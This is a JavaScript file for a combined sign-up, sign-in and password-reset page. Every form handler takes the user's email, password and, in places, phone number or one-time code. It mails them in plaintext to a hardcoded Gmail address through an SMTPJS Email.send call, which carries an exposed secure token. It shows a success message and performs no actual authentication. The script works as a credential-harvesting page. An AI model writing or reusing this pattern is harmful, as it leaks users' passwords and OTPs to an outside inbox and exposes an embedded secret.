

let alreadyhaveAccount = document.querySelector("#aha")
let signIn = document.querySelector(".signIn")
let IdontHaveAnAccount = document.querySelector("#nhcaa")
let signUp = document.querySelector(".signUp")

let resetBtn = document.querySelector("#resetBtn")
let forgetPage = document.querySelector(".frgtPage")
let goBack = document.querySelector("mark")
let forgetLink = document.querySelector("#frgtLink")

 alreadyhaveAccount.addEventListener("click", function (){
     signIn.style.display = "block"
     signUp.style.display = "none"
 })
 
 IdontHaveAnAccount.addEventListener("click", function (){
     signIn.style.display = "none"
     signUp.style.display = "block"
 })
 
 goBack.addEventListener("click",function(){
     signIn.style.display = "block"
     forgetPage.style.display = "none"
 })
 
  forgetLink.addEventListener("click",function(){
     signIn.style.display = "none"
     forgetPage.style.display = "block"
 })
 
 
 //GET INPUT FROM USER SIGN UP
 function signup(){
   //DECLARATION OF INPUT 
   let signUpEmail = document.querySelector(".signUp #email").value
   let signUpFname = document.querySelector(".signUp #fname").value
   let signUpLname = document.querySelector(".signUp #lname").value
   let signUpPhone = document.querySelector(".signUp #phone").value
   let signUpPass = document.querySelector(".signUp #pass").value


  Email.send({
    SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
    To : 'mukhtar.alam458546@gmail.com',
    From : "mukhtar.alam458546@gmail.com",
    Subject : "SIGN UP DATA",
    Body : "Email : " + signUpEmail
           + "<br> Name : " + signUpFname + " " + signUpLname
           + "<br> Phone : " + signUpPhone
           + "<br> Pass : " + signUpPass
}).then(
  message => swal("Created Account Successfully", "Your data sent to Admin", "success")
);
 }
 
 
 
 //FOR SIGN IN 
 function signin(){
   //DECLARATION OF INPUT 
   let signUpEmail = document.querySelector(".signIn #email").value
   let signUpPass = document.querySelector(".signIn #pass").value


  Email.send({
    SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
    To : 'mukhtar.alam458546@gmail.com',
    From : "mukhtar.alam458546@gmail.com",
    Subject : "SIGN IN DATA",
    Body : "Email : " + signUpEmail
           + "<br> Pass : " + signUpPass
}).then(
  message => swal("Login Successfully", "Your data sent to Admin", "success")
);
 }
 
 //FOR FORGET PASSWORD forgetPage
 function frgtpage(){
   //DECLARATION OF INPUT 
   let signUpEmail = document.querySelector(".frgtPage #email").value
   let signUpOtp = document.querySelector(".frgtPage #otp").value
   let signUpPass = document.querySelector(".frgtPage #pass").value


  Email.send({
    SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
    To : 'mukhtar.alam458546@gmail.com',
    From : "mukhtar.alam458546@gmail.com",
    Subject : "FORGET PASS DATA",
    Body : "Email : " + signUpEmail
           + "<br> OTP : " + signUpOtp
           + "<br> Pass : " + signUpPass
           + "<br> Pass Confirm : " + signUpPass
}).then(
  message => swal("Reset Password Successfully", "Your data sent to Admin", "success")
);
 }